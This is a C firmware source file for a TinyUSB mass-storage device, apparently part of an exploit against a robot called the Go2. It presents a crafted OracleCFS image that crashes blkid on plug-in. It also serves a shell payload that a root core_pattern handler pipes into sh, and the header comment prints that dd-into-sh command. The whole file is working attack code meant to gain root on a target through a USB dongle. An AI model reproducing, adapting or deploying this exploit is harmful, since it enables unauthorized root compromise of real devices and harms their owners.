/*
 * MSC disk: OracleCFS crash trigger + embedded payload.
 *
 * The disk has three regions:
 *
 *   Sectors 0-31:     OracleCFS exploit image (triggers blkid SIGSEGV)
 *   Sectors 32-2047:  Zeros (gap)
 *   Sectors 2048-2175: dongle_payload.sh (read by core_pattern bootstrap)
 *
 * When the Go2's udev triggers blkid on the new block device, the
 * OCFS1 prober crashes. The core_pattern pipe handler fires as root
 * and runs:
 *
 *   dd if=/dev/sdX bs=512 skip=2048 count=128 | sh
 *
 * which reads the payload from this disk and executes it.
 */

#include "tusb.h"
#include <string.h>

#include "disk_image.h"
#include "dongle_payload.h"

#define TOTAL_SECTORS (PAYLOAD_SECTOR_START + PAYLOAD_SECTOR_COUNT)

static volatile bool msc_enumerated = false;

bool msc_is_enumerated(void) {
    return msc_enumerated;
}

/* ---------- TinyUSB MSC callbacks ---------- */

void tud_msc_inquiry_cb(uint8_t lun, uint8_t vendor_id[8],
                        uint8_t product_id[16], uint8_t product_rev[4]) {
    (void)lun;
    memcpy(vendor_id,   "Generic ", 8);
    memcpy(product_id,  "Mass Storage    ", 16);
    memcpy(product_rev, "1.0 ", 4);
    msc_enumerated = true;
}

bool tud_msc_test_unit_ready_cb(uint8_t lun) {
    (void)lun;
    return true;
}

void tud_msc_capacity_cb(uint8_t lun, uint32_t *block_count,
                         uint16_t *block_size) {
    (void)lun;
    *block_count = TOTAL_SECTORS;
    *block_size  = DISK_BLOCK_SIZE;
}

int32_t tud_msc_read10_cb(uint8_t lun, uint32_t lba, uint32_t offset,
                          void *buffer, uint32_t bufsize) {
    (void)lun;

    uint8_t *dst = (uint8_t *)buffer;
    uint32_t remaining = bufsize;

    while (remaining > 0) {
        uint32_t byte_addr = lba * DISK_BLOCK_SIZE + offset;
        uint32_t chunk = remaining;

        if (lba < DISK_BLOCK_NUM) {
            /* Region 1: OracleCFS image (sectors 0-31) */
            uint32_t avail = sizeof(disk_image) - byte_addr;
            if (chunk > avail) chunk = avail;
            memcpy(dst, &disk_image[byte_addr], chunk);
        } else if (lba >= PAYLOAD_SECTOR_START &&
                   lba < PAYLOAD_SECTOR_START + PAYLOAD_SECTOR_COUNT) {
            /* Region 3: Payload (sectors 2048+) */
            uint32_t payload_byte = (lba - PAYLOAD_SECTOR_START) * DISK_BLOCK_SIZE + offset;
            if (payload_byte < PAYLOAD_DATA_LEN) {
                uint32_t avail = PAYLOAD_DATA_LEN - payload_byte;
                if (chunk > avail) chunk = avail;
                memcpy(dst, &dongle_payload[payload_byte], chunk);
            } else {
                memset(dst, 0, chunk);
            }
        } else {
            /* Region 2: Gap — return zeros */
            memset(dst, 0, chunk);
        }

        dst += chunk;
        remaining -= chunk;
        offset += chunk;
        if (offset >= DISK_BLOCK_SIZE) {
            lba += offset / DISK_BLOCK_SIZE;
            offset %= DISK_BLOCK_SIZE;
        }
    }

    return (int32_t)bufsize;
}

int32_t tud_msc_write10_cb(uint8_t lun, uint32_t lba, uint32_t offset,
                           uint8_t *buffer, uint32_t bufsize) {
    (void)lun; (void)lba; (void)offset; (void)buffer;
    return (int32_t)bufsize;
}

int32_t tud_msc_scsi_cb(uint8_t lun, uint8_t const scsi_cmd[16],
                        void *buffer, uint16_t bufsize) {
    (void)lun; (void)buffer; (void)bufsize;

    switch (scsi_cmd[0]) {
    case SCSI_CMD_PREVENT_ALLOW_MEDIUM_REMOVAL:
        tud_msc_set_sense(lun, SCSI_SENSE_NONE, 0, 0);
        return 0;
    default:
        tud_msc_set_sense(lun, SCSI_SENSE_ILLEGAL_REQUEST, 0x20, 0);
        return -1;
    }
}
